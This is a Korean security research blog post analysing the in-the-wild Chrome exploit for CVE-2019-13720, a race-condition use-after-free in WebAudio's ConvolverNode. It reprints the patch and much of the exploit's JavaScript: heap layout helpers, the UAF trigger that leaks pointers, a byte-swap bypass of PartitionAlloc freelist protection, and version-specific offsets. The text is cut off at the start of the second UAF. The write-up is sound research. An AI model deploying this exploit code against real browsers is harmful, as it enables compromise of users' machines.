<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
  

  <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>chrome CVE-2019-13720 exploit | Core-Research-Team</title>
<meta name="generator" content="Jekyll v4.0.1" />
<meta property="og:title" content="chrome CVE-2019-13720 exploit" />
<meta name="author" content="NextLine" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="라온화이트햇 핵심연구팀 이영주" />
<meta property="og:description" content="라온화이트햇 핵심연구팀 이영주" />
<link rel="canonical" href="http://localhost:4000/2020-07-01/chrome-CVE-2019-13720-exploit" />
<meta property="og:url" content="http://localhost:4000/2020-07-01/chrome-CVE-2019-13720-exploit" />
<meta property="og:site_name" content="Core-Research-Team" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-07-01T00:00:00+00:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"chrome CVE-2019-13720 exploit","dateModified":"2020-07-01T00:00:00+00:00","datePublished":"2020-07-01T00:00:00+00:00","author":{"@type":"Person","name":"NextLine"},"url":"http://localhost:4000/2020-07-01/chrome-CVE-2019-13720-exploit","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020-07-01/chrome-CVE-2019-13720-exploit"},"description":"라온화이트햇 핵심연구팀 이영주","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">

  <!-- Favicon -->
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">

  <!-- RSS -->
  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Core-Research-Team" />

  <!-- Google Analytics-->
  
 
</head>


  <body>

    <nav class="nav">
  <div class="nav-container">
    <a href="/">
      <h2 class="nav-title">RAON - Core Research Team</h2>
    </a>
    <ul>
      <li><a href="/about">About</a></li>
      <li><a href="/">Posts</a></li>
    </ul>
  </div>
</nav>


    <main>
      <div class="post"> 
   <h1 class="post-title">chrome CVE-2019-13720 exploit</h1>
   <div class="post-line"></div>

   
      
         
            <span class="tag"><center><i>CVE</i></center></span>
         
      
         
            <span class="tag"><center><i>pwnable</i></center></span>
         
      
   
   
   <ul>
  <li><a href="#1-intro">1. Intro</a></li>
  <li><a href="#2-exploit">2. Exploit</a></li>
</ul>
   
   <p>라온화이트햇 핵심연구팀 이영주</p>

<h1 id="1-intro">1. Intro</h1>

<p>이 취약점은 북한 뉴스 사이트에서 사용된 0day exploit에서 발견한 취약점이라고 합니다. 저는 <a href="https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/">https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/</a> 이곳의 내용을 쉽게 읽을 수 있도록 정리했습니다.</p>

<h1 id="2-exploit">2. Exploit</h1>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Obtain graph/process lock when nullifying the buffer in Reverb

When the buffer is set to `null` while there is an active buffer
within a reverb object, SetBuffer() function can prematurely
nullify the `reverb_` and `shared_buffer_` while it is still
being accessed by the rendering thread.

This CL adds two locks (graph lock and process lock) when the
buffer gets nullified to ensure the synchronization between
two threads.

Change-Id: I8f501b6a16b3c7e16db767e0b279a1a53d6eb290
Bug: 1019226
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1888103
Commit-Queue: Hongchan Choi &lt;hongchan@chromium.org&gt;
Reviewed-by: Robert Sesek &lt;rsesek@chromium.org&gt;
Cr-Commit-Position: refs/heads/master@{#710627}
</code></pre></div></div>

<p>취약점은 race-condition이며 취약점은 크롬 78.0.3904.87에서 패치되었습니다. 패치된 커밋은 위와 같습니다.</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/third_party/blink/renderer/modules/webaudio/convolver_node.cc b/third_party/blink/renderer/modules/webaudio/convolver_node.cc
index c67a0ba..ce19fe6 100644
</span><span class="gd">--- a/third_party/blink/renderer/modules/webaudio/convolver_node.cc
</span><span class="gi">+++ b/third_party/blink/renderer/modules/webaudio/convolver_node.cc
</span><span class="p">@@ -103,6 +103,8 @@</span>
   DCHECK(IsMainThread());
 
   if (!buffer) {
<span class="gi">+    BaseAudioContext::GraphAutoLocker context_locker(Context());
+    MutexLocker locker(process_lock_);
</span>     reverb_.reset();
     shared_buffer_ = nullptr;
     return;
</code></pre></div></div>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">MODULES_EXPORT</span> <span class="n">ConvolverHandler</span> <span class="k">final</span> <span class="o">:</span> <span class="k">public</span> <span class="n">AudioHandler</span> <span class="p">{</span>
<span class="p">...</span>
  <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="n">Reverb</span><span class="o">&gt;</span> <span class="n">reverb_</span><span class="p">;</span>
  <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="n">SharedAudioBuffer</span><span class="o">&gt;</span> <span class="n">shared_buffer_</span><span class="p">;</span>
<span class="p">...</span>
</code></pre></div></div>

<p>패치된 내용은 단 두줄인데, 패치된 기능은 ConvolverNode에서 audio buffer가 null이라면 reverb_ 객체와 shared_buffer_ 객체를 free하는 부분입니다. 이곳에 스레드 동기화에 관한 코드가 없기 때문에 free된 이후에도 객체가 다른 스레드에서 사용되고 있을 수 있습니다. 따라서 패치는 race를 방지하는 mutex가 추가되었습니다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">getSuperPageBase</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">superPageOffsetMask</span> <span class="o">=</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">21</span><span class="p">))</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">superPageBaseMask</span> <span class="o">=</span> <span class="o">~</span><span class="nx">superPageOffsetMask</span><span class="p">;</span>
	<span class="kd">let</span> <span class="nx">superPageBase</span> <span class="o">=</span> <span class="nx">addr</span> <span class="o">&amp;</span> <span class="nx">superPageBaseMask</span><span class="p">;</span>
	<span class="k">return</span> <span class="nx">superPageBase</span><span class="p">;</span>
<span class="p">}</span>
 
<span class="kd">function</span> <span class="nx">getPartitionPageBaseWithinSuperPage</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">partitionPageIndex</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">superPageBase</span> <span class="o">=</span> <span class="nx">getSuperPageBase</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">partitionPageBase</span> <span class="o">=</span> <span class="nx">partitionPageIndex</span> <span class="o">&lt;&lt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">14</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">finalAddr</span> <span class="o">=</span> <span class="nx">superPageBase</span> <span class="o">+</span> <span class="nx">partitionPageBase</span><span class="p">;</span>
	<span class="k">return</span> <span class="nx">finalAddr</span><span class="p">;</span>
<span class="p">}</span>
 
<span class="kd">function</span> <span class="nx">getPartitionPageIndex</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">superPageOffsetMask</span> <span class="o">=</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">21</span><span class="p">))</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">partitionPageIndex</span> <span class="o">=</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">&amp;</span> <span class="nx">superPageOffsetMask</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">14</span><span class="p">);</span>
	<span class="k">return</span> <span class="nx">partitionPageIndex</span><span class="p">;</span>
<span class="p">}</span>
 
<span class="kd">function</span> <span class="nx">getMetadataAreaBaseFromPartitionSuperPage</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">superPageBase</span> <span class="o">=</span> <span class="nx">getSuperPageBase</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">systemPageSize</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
	<span class="k">return</span> <span class="nx">superPageBase</span> <span class="o">+</span> <span class="nx">systemPageSize</span><span class="p">;</span>
<span class="p">}</span>
 
<span class="kd">function</span> <span class="nx">getPartitionPageMetadataArea</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">superPageOffsetMask</span> <span class="o">=</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">21</span><span class="p">))</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">partitionPageIndex</span> <span class="o">=</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">&amp;</span> <span class="nx">superPageOffsetMask</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">14</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">pageMetadataSize</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">partitionPageMetadataPtr</span> <span class="o">=</span> <span class="nx">getMetadataAreaBaseFromPartitionSuperPage</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">+</span> <span class="nx">partitionPageIndex</span> <span class="o">*</span> <span class="nx">pageMetadataSize</span><span class="p">;</span>
	<span class="k">return</span> <span class="nx">partitionPageMetadataPtr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>취약점에서 핵심적인 내용은 PartitionAlloc의 chunk를 exploit 했다는 점인데, 예전에는 이 allocator에서 취약점이 발생했다면 exploit 하는게 거의 불가능하다고 판단했습니다. 하지만 최근에 공개된 여러 자료에 서 PartitionAlloc chunk도 exploit할 수 있는 기법이 알려졌고 이 exploit도 그런 종류중에 하나입니다.
구글도 이 사실을 인지하고있고 이 문제를 해결할 방법을 찾고있는걸로 알고있습니다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">gcPreventer</span> <span class="o">=</span> <span class="p">[];</span>
<span class="kd">let</span> <span class="nx">iirFilters</span> <span class="o">=</span> <span class="p">[];</span>
 
<span class="kd">function</span> <span class="nx">initialSetup</span><span class="p">()</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">audioCtx</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OfflineAudioContext</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">3000</span><span class="p">);</span>
 
	<span class="kd">let</span> <span class="nx">feedForward</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">feedback</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
 
	<span class="nx">feedback</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="nx">feedForward</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="nx">feedForward</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
 
	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
        <span class="nx">iirFilters</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">audioCtx</span><span class="p">.</span><span class="nx">createIIRFilter</span><span class="p">(</span><span class="nx">feedForward</span><span class="p">,</span> <span class="nx">feedback</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>exploit 초반부는 OfflineAudioContext를 생성하고 두 개의 float을 통해 초기화되는 IIRFilterNode 객체를 생성합니다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">triggerUaF</span><span class="p">(</span><span class="nx">doneCb</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">audioCtx</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OfflineAudioContext</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x400000</span><span class="p">,</span> <span class="mi">48000</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">bufferSource</span> <span class="o">=</span> <span class="nx">audioCtx</span><span class="p">.</span><span class="nx">createBufferSource</span><span class="p">();</span>
	<span class="kd">let</span> <span class="nx">convolver</span> <span class="o">=</span> <span class="nx">audioCtx</span><span class="p">.</span><span class="nx">createConvolver</span><span class="p">();</span>
	<span class="kd">let</span> <span class="nx">scriptNode</span> <span class="o">=</span> <span class="nx">audioCtx</span><span class="p">.</span><span class="nx">createScriptProcessor</span><span class="p">(</span><span class="mh">0x4000</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">channelBuffer</span> <span class="o">=</span> <span class="nx">audioCtx</span><span class="p">.</span><span class="nx">createBuffer</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">48000</span><span class="p">);</span>
 
	<span class="nx">convolver</span><span class="p">.</span><span class="nx">buffer</span> <span class="o">=</span> <span class="nx">channelBuffer</span><span class="p">;</span>
	<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">buffer</span> <span class="o">=</span> <span class="nx">channelBuffer</span><span class="p">;</span>
 
	<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">loop</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
	<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">loopStart</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">loopEnd</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
 
	<span class="nx">channelBuffer</span><span class="p">.</span><span class="nx">getChannelData</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nx">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 
	<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">convolver</span><span class="p">);</span>
	<span class="nx">convolver</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">scriptNode</span><span class="p">);</span>
	<span class="nx">scriptNode</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">audioCtx</span><span class="p">.</span><span class="nx">destination</span><span class="p">);</span>
 
	<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">start</span><span class="p">();</span>
 
	<span class="kd">let</span> <span class="nx">finished</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
 
	<span class="nx">scriptNode</span><span class="p">.</span><span class="nx">onaudioprocess</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span>
    		<span class="kd">let</span> <span class="nx">channelDataArray</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">evt</span><span class="p">.</span><span class="nx">inputBuffer</span><span class="p">.</span><span class="nx">getChannelData</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nx">buffer</span><span class="p">);</span>
 
    		<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">channelDataArray</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        		<span class="k">if</span> <span class="p">(</span><span class="nx">j</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="nx">channelDataArray</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="nx">channelDataArray</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">channelDataArray</span><span class="p">[</span><span class="nx">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            			<span class="kd">let</span> <span class="nx">u64Array</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
            			<span class="kd">let</span> <span class="nx">u32Array</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">u64Array</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
            			<span class="nx">u32Array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">channelDataArray</span><span class="p">[</span><span class="nx">j</span> <span class="o">+</span> <span class="mi">0</span><span class="p">];</span>
            			<span class="nx">u32Array</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">channelDataArray</span><span class="p">[</span><span class="nx">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
 
            			<span class="kd">let</span> <span class="nx">leakedAddr</span> <span class="o">=</span> <span class="nx">byteSwapBigInt</span><span class="p">(</span><span class="nx">u64Array</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
            			<span class="k">if</span> <span class="p">(</span><span class="nx">leakedAddr</span> <span class="o">&gt;&gt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x8000</span><span class="p">))</span>
                			<span class="nx">leakedAddr</span> <span class="o">-=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x800000000000</span><span class="p">);</span>
             			<span class="kd">let</span> <span class="nx">superPageBase</span> <span class="o">=</span> <span class="nx">getSuperPageBase</span><span class="p">(</span><span class="nx">leakedAddr</span><span class="p">);</span>
 
	             		<span class="k">if</span> <span class="p">(</span><span class="nx">superPageBase</span> <span class="o">&gt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0xFFFFFFFF</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">superPageBase</span> <span class="o">&lt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFF</span><span class="p">))</span> <span class="p">{</span>
                			<span class="nx">finished</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
                			<span class="nx">evt</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
 
                			<span class="nx">bufferSource</span><span class="p">.</span><span class="nx">disconnect</span><span class="p">();</span>
                			<span class="nx">scriptNode</span><span class="p">.</span><span class="nx">disconnect</span><span class="p">();</span>
                			<span class="nx">convolver</span><span class="p">.</span><span class="nx">disconnect</span><span class="p">();</span>
 
                			<span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                     			<span class="nx">doneCb</span><span class="p">(</span><span class="nx">leakedAddr</span><span class="p">);</span>
                			<span class="p">},</span> <span class="mi">1</span><span class="p">);</span>
 
                			<span class="k">return</span><span class="p">;</span>
            			<span class="p">}</span>
        		<span class="p">}</span>
    		<span class="p">}</span>
	<span class="p">};</span>
 
	<span class="nx">audioCtx</span><span class="p">.</span><span class="nx">startRendering</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)</span> <span class="p">{</span>
    		<span class="nx">buffer</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
 
    		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">finished</span><span class="p">)</span> <span class="p">{</span>
        	 	<span class="nx">finished</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
       	  	<span class="nx">triggerUaF</span><span class="p">(</span><span class="nx">doneCb</span><span class="p">);</span>
    		<span class="p">}</span>
	<span class="p">});</span>
 
	<span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nx">finished</span><span class="p">)</span> <span class="p">{</span>
    		<span class="nx">convolver</span><span class="p">.</span><span class="nx">buffer</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
    		<span class="nx">convolver</span><span class="p">.</span><span class="nx">buffer</span> <span class="o">=</span> <span class="nx">channelBuffer</span><span class="p">;</span>
    		<span class="k">await</span> <span class="nx">later</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span> <span class="c1">// wait 100 millseconds</span>
	<span class="p">}</span>
<span class="p">};</span>
</code></pre></div></div>

<p>이후 Reverb component에 필요한 객체들을 생성하고 OfflineAudioContext와 두개의 ConvolverNode를 생성하여 UAF를 트리거합니다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">later</span><span class="p">(</span><span class="nx">delay</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">delay</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>위 함수를 재귀적으로 호출하여 오디오 채널 버퍼를 0으로 채우고 렌더링을 시작함과 동시 ConvolverNode버퍼를 재설정해서 취약점을 트리거합니다. 여기서 later 함수는 sleep 함수처럼 현재 스레드를 일시 중지하는 역할을 합니다.</p>

<p>실행 중에 exploit은 오디오 채널 버퍼에 0이 아닌 다른값이 있는지 체크해서 만약 다른값이 있다면 UAF가 트리거 되었다고 판단합니다. 이렇게 UAF를 트리거했으면 버퍼에 릭된 값들이 존재합니다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">byteSwapBigInt</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">tmp</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
 
	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="nx">result</span> <span class="o">=</span> <span class="nx">result</span> <span class="o">&lt;&lt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
    		<span class="nx">result</span> <span class="o">+=</span> <span class="nx">tmp</span> <span class="o">&amp;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0xFF</span><span class="p">);</span>
    		<span class="nx">tmp</span> <span class="o">=</span> <span class="nx">tmp</span> <span class="o">&gt;&gt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
	<span class="p">}</span>
 
	<span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>PartitionAlloc 메모리 할당자는 위처럼 특수한 exploit 보호기법이 존재합니다. 메모리 영역이 free되면 포인터의 주소를 바이트 스왑한 주소가 free list에 추가됩니다. 따라서 이 주소를 참조하려고하면 크래시가 발생해서 exploit이 어려워집니다. 이 기법을 우회하기 위한 바이트 스왑 함수가 존재합니다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">sharedAudioCtx</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">iirFilterFeedforwardAllocationPtr</span><span class="p">;</span>
 
<span class="kd">function</span> <span class="nx">initialUAFCallback</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">sharedAudioCtx</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OfflineAudioContext</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3000</span><span class="p">);</span>
 
	<span class="kd">let</span> <span class="nx">partitionPageIndexDelta</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
	<span class="k">switch</span> <span class="p">(</span><span class="nx">majorVersion</span><span class="p">)</span> <span class="p">{</span>
    		<span class="k">case</span> <span class="mi">77</span><span class="p">:</span> <span class="c1">// 77.0.3865.75</span>
        	 	<span class="nx">partitionPageIndexDelta</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="o">-</span><span class="mi">26</span><span class="p">);</span>
        	<span class="k">break</span><span class="p">;</span>
    		<span class="k">case</span> <span class="mi">76</span><span class="p">:</span> <span class="c1">// 76.0.3809.87</span>
         		<span class="nx">partitionPageIndexDelta</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="o">-</span><span class="mi">25</span><span class="p">);</span>
      	   	<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>
 
	<span class="nx">iirFilterFeedforwardAllocationPtr</span> <span class="o">=</span> <span class="nx">getPartitionPageBaseWithinSuperPage</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">getPartitionPageIndex</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">+</span> <span class="nx">partitionPageIndexDelta</span><span class="p">)</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0xFF0</span><span class="p">);</span>
 
    <span class="nx">triggerSecondUAF</span><span class="p">(</span><span class="nx">byteSwapBigInt</span><span class="p">(</span><span class="nx">iirFilterFeedforwardAllocationPtr</span><span class="p">),</span> <span class="nx">finalUAFCallback</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>exploit 진행 시, leak된 포인터를 써서 SuperPage 주소를 가져와 확인합니다. exploit이 잘 진행되었으면 면 initialUAFCallback에 temporary_buffer_ 객체의 raw pointer가 전달됩니다.</p>

<p>이후 leak된 포인터를 이용해 IIRProcessor객체에 존재하는 AudioArray <double> 타입의 feedforward_ 주소를 가져옵니다. 이 배열은 동일한 SuperPage에 존재해야 하지만 다른 버전의 Chrome에서는 이 객체가 다른 PartitionPages에 만들어져서 이를 처리하기 위한 코드가 존재합니다.</double></p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">floatArray</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float32Array</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">audioBufferArray1</span> <span class="o">=</span> <span class="p">[];</span>
<span class="kd">let</span> <span class="nx">audioBufferArray2</span> <span class="o">=</span> <span class="p">[];</span>
<span class="kd">let</span> <span class="nx">imageDataArray</span> <span class="o">=</span> <span class="p">[];</span>
 
<span class="k">async</span> <span class="kd">function</span> <span class="nx">triggerSecondUAF</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">doneCb</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kd">let</span> <span class="nx">numChannels</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
 
	<span class="kd">let</span> <span class="nx">audioCtx</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OfflineAudioContext</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x100000</span><span class="p">,</span> <span class="mi">48000</span><span class="p">);</span>
 
